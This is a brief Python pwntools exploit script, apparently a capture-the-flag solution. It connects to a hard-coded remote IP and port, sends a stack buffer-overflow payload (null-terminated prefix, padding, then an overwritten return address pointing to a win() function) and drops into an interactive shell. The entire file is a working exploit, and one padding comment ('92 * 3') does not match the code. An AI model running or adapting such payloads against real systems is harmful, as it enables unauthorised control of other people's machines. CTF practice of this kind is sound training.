from pwn import *

context(arch='amd64', os='linux')

HOST, PORT = "34.45.81.67", 16002
WIN_ADDR = 0x401262   # win() address (verify with objdump -d chall)

# Craft payload with null termination and precise offset
payload = b"ppp"                     # Safe prefix (3 bytes)
payload += b"\x00"                   # Early string termination
payload += b"\x20\xac" * 138      # Padding (92 * 3 = 276 bytes)
payload += p64(WIN_ADDR)             # Overwrite return address

print(f"Payload length: {len(payload)} bytes")
print(f"Payload: {payload}")

# Send payload to remote
p = remote(HOST, PORT)
p.recvuntil(b"Enter your input (max 255 bytes): ")
p.send(payload)

# Enjoy shell
p.interactive()